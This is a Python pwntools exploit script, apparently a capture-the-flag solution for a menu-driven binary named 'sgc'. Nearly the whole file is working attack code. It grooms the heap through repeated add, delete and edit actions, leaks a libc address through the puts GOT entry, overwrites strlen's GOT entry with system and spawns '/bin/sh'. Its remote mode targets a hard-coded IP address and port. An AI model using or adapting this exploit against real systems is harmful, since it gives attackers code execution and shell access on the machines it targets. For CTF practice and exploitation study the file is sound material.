from pwn import *
import sys
from time import time, sleep

LOCAL_LIBC32 = "/lib/i386-linux-gnu/libc.so.6"
LOCAL_LIBC64 = "/lib/x86_64-linux-gnu/libc.so.6"

BINARY = "./sgc"
LIBC = "./libc-2.26.so"
LOCAL_LIBC = LOCAL_LIBC64

context.clear()
context(os="linux", arch="amd64", bits=64)
# context.log_level = 'debug'

# def recvsend(conn, data):
#     conn.recvline()
#     conn.sendline(data)

def recvmenu(conn):
    conn.recvuntil("Action: ")

def adduser(conn, name, group, age):
    recvmenu(conn)
    conn.sendline("0")
    conn.recvuntil("name: ")
    conn.send(name)
    conn.recvuntil("group: ")
    conn.send(group)
    conn.recvuntil("age: ")
    conn.sendline(str(age))

def dispgrp(conn, grp):
    r = []
    recvmenu(conn)
    conn.sendline("1")
    conn.recvuntil("name: ")
    conn.send(grp)
    if "User:" in conn.recvline():
        while True:
            t = []
            conn.recvuntil("Name: ")
            t.append(conn.recvuntil("\n\tGroup: ")[:-len("\n\tGroup: ")])
            t.append(conn.recvuntil("\n\tAge: ")[:-len("\n\tAge: ")])
            k = ""
            z = ""
            while ("User:" not in z) and ("0: Add a user" not in z):
                k += z
                z = conn.recvline()
            t.append(k[:-1])
            r.append(t)
            if "0: Add a user" in z:
                break
    return r

def dispuser(conn, idx):
    r = []
    recvmenu(conn)
    conn.sendline("2")
    conn.recvuntil("index: ")
    conn.sendline(str(idx))
    if "User:" in conn.recvline():
        conn.recvuntil("Name: ")
        r.append(conn.recvuntil("\n\tGroup: ")[:-len("\n\tGroup: ")])
        r.append(conn.recvuntil("\n\tAge: ")[:-len("\n\tAge: ")])
        r.append(conn.recvuntil("\n0: Add a user")[:-len("\n0: Add a user")])
        return r
    return None

def editgrp(conn, idx, yn, name):
    recvmenu(conn)
    conn.sendline("3")
    conn.recvuntil("index: ")
    conn.sendline(str(idx))
    conn.recvuntil("(y/n): ")
    conn.sendline(yn)
    conn.recvuntil("name: ")
    conn.send(name)

def deluser(conn, idx):
    recvmenu(conn)
    conn.sendline("4")
    conn.recvuntil("index: ")
    conn.sendline(str(idx))

def exploit(conn, elf, libc, local):
    sleep(2)
    adduser(conn, "A\n", "B\n", 10) # 0
    adduser(conn, "A\n", "D\n", 10) # 1
    adduser(conn, "A\n", "C\n", 10) # 2

    deluser(conn, 2)

    for _ in range(8):
        adduser(conn, "a\n", "b\n", 0)
        deluser(conn, 2)

    adduser(conn, "A\n", "K\n", 10) # 2
    for _ in range(255):
        log.info(_)
        editgrp(conn, 2, "n", "K\n")

    adduser(conn, "A"*0x30 + "\n", "D\n", 10) # 3
    adduser(conn, "B"*0x30 + "\n", "D\n", 10) # 4

    editgrp(conn, 2, "y", "B"*8 + p64(elf.got['puts'])[:-1] + "\n")
    x = dispuser(conn, 4)
    libc.address = u64(x[0].ljust(8, "\x00")) - libc.symbols['puts']
    log.info("%#x", libc.address)

    editgrp(conn, 2, "y", "B"*8 + p64(elf.got['puts']) + p64(elf.got['strlen']))
    editgrp(conn, 4, "y", p64(libc.symbols['system']) + "\n")

    adduser(conn, "/bin/sh\x00\n", "AAAA\n", 0)
    conn.interactive()
    return

if __name__ == "__main__":
    elf = ELF(BINARY)
    try:
        if sys.argv[1] == "remote":
            H,P = ("35.198.176.224", 1337)
            r = remote(H, P)
            libc = ELF(LIBC) if LIBC else None
            exploit(r, elf, libc, local=False)
        elif sys.argv[1] == "local":
            r = process(BINARY)
            log.info("PID: {}".format(r.proc.pid))
            libc = ELF(LOCAL_LIBC) if LOCAL_LIBC else None
            pause()
            exploit(r, elf, libc, local=True)
        elif sys.argv[1] == "docker":
            r = process(BINARY, env = {"LD_PRELOAD": LIBC})
            libc = ELF(LIBC) if LIBC else None
            pause()
            exploit(r, elf, libc, local=True)
        else:
            print "Usage: {} local|docker|remote".format(sys.argv[0])
            sys.exit(1)
    except IndexError:
        r = process(BINARY)
        log.info("PID: {}".format(r.proc.pid))
        libc = ELF(LOCAL_LIBC) if LOCAL_LIBC else None
        pause()
        exploit(r, elf, libc, local=True)
